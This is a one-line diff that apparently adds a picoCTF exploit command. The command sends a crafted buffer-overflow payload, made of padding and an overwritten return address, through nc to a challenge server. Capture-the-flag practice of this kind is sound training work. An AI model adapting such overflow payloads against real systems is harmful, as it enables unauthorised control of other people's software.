@@ -1,0 +1,1 @@
+echo -e "\n2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\xa0\x11@\x00\x00\x00\x00\x00\n4" | nc mimas.picoctf.net <PORT>
